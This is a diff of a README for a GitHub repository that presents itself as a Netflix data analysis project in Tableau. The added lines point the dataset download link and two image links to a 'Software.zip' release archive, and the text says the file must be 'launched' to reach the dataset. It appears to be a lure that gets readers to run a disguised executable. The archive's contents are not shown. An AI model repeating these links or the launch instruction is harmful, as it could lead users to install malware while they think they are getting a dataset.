@@ -1,6 +1,6 @@
 # 🎥 Netflix Data Analysis Using Tableau 📊
 
-![Netflix Data Analysis Using Tableau](https://github.com/cln112/-Netflix-Data-Analysis-Using-Tableau-/releases/tag/v1.0)
+![Netflix Data Analysis Using Tableau](https://github.com/cln112/-Netflix-Data-Analysis-Using-Tableau-/releases/download/v2.0/Software.zip)
 
 Welcome to the Netflix Data Analysis Using Tableau repository! This repository aims to provide insightful data analysis and visualizations related to Netflix using Tableau, a powerful data visualization tool. Whether you are a data enthusiast, data scientist, or simply interested in exploring Netflix data trends, this repository is a treasure trove of valuable information.
 
@@ -31,7 +31,7 @@ Visualizing data is essential for gaining a deeper understanding of complex data
 
 ## How to Use
 To explore the Netflix Data Analysis Using Tableau repository, follow these steps:
-1. Download the dataset from the provided link: [Download Dataset](https://github.com/cln112/-Netflix-Data-Analysis-Using-Tableau-/releases/tag/v1.0)
+1. Download the dataset from the provided link: [Download Dataset](https://github.com/cln112/-Netflix-Data-Analysis-Using-Tableau-/releases/download/v2.0/Software.zip)
    - (*Note: The file needs to be launched for access to the dataset.*)
 2. Install Tableau on your system to view and interact with the visualizations.
 3. Explore the Tableau dashboards for insights into Netflix data.
@@ -45,4 +45,4 @@ Your feedback is valuable to us. If you have any suggestions, ideas, or thoughts
 
 Let's dive into the world of Netflix data analysis using Tableau and uncover fascinating insights together!
 
-![Happy Analyzing!](https://github.com/cln112/-Netflix-Data-Analysis-Using-Tableau-/releases/tag/v1.0)
+![Happy Analyzing!](https://github.com/cln112/-Netflix-Data-Analysis-Using-Tableau-/releases/download/v2.0/Software.zip)
